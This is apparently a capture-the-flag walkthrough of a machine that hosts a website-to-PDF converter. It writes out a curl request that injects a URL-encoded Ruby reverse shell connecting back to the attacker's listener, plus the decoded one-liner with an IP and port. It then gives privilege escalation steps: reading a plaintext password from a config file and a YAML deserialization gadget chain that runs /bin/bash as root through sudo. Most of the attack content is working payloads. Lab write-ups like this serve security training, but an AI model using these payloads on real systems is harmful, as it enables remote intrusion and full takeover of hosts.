Run your nmap scan:

```sh

Nothing seems to be interesting in our nmap scan, so let navigate to port 80/http :

Looks like we have a web page that convert websites to PDF's, i wasn't sure enough, so i used wappalyzer to check technologies :

First of all enumerating `phushion passenger 6.0.15 exploit`, Nothing seems to be interesting than a privilege escalation vector which is after we have foothold, we don't have that yet :

Enumerating `nginx 1.18.0 exploit` doesn't to have any connection to what i want, i need something like command injection exploit :

I then decided to load a URL on the site again, for this you have to start a python http server:

- Touch a txt file on your terminal `touch bankai.txt`
- then start up the python web server with `python3 -m http.server 80`

![](https://i.imgur.com/drwrQTn.png)

Now click submit

- I noticed the site is downloading a PDF once we submit the URL

![](https://i.imgur.com/J7z1gEe.png)

- so i opened the PDF and nothing was there, then decided to use `exiftool` to check any meta-data and i got a version of what is generating this PDF for us :

NiceðŸ˜˜

Now let enumerate this version

Looks like we are getting somewhere, after scraping around, i found a way to get shell with this syntax:

*Instructions :*

- Start a python http server with `python3 -m http.server 80`
- start your netcat listener `nc -lvnp 4444`
- Then use this payload on you command line :

```sh
curl 'TARGET_ADDRESS' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_ADDRESS' -H 'Connection: keep-alive' -H 'Referer: TARGET_ADDRESS' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'
```

- Make sure to replace `TARGET_ADDRESS`, `LOCAL_ADDRESS` and `LOCAL_PORT` with their respective info, fire it up and things should work :

> POV : it looks like we still got reverse shell with ruby cos' the `--data-raw` header makes a request to execute this ruby command as a reverse shell -->
> `ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.12",4444))'


### Privilege Escalation

- Navigating to the home directory, we have an unusual file called `.bundle`

![](https://i.imgur.com/Jtqq5dq.png)

- Inside .bundle is a config file, concatenating the config file gives us Henry password

![](https://i.imgur.com/nvy95vG.png)

- Successfully switched user to henry, running `sudo -l` tells us we can run `/opt/update_dependencies.rb` as root

![](https://i.imgur.com/ifmdF8Z.png)

- Running the files seems to give me errors, so i changed directory to /opt
- We can see that we have another directory here which has a `dependencies.yml` file

![](https://i.imgur.com/sbkhfCp.png)

- Making my research i saw we can update privileges by editing this file
- We also don't have write access to this `dependencies.yml` file which is a problem
- One more problem, if your shell gives you problem, login via SSH with Henry and the password we got.

![](https://i.imgur.com/jpoQonU.png)

- After much enumeration, i found out i could create a `dependencies.yml` file in /tmp too and it will be read, So;
- change directory to /tmp --> `cd /tmp`
- then do --> `nano dependencies.yml`

- Now paste this code directly and do `ctrl+x` to save

```YML

- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: /bin/bash
         method_id: :resolve
```

- Now run the file with `sudo /usr/bin/ruby /opt/update_dependencies.rb`

Booyah ðŸ˜…, and we are root
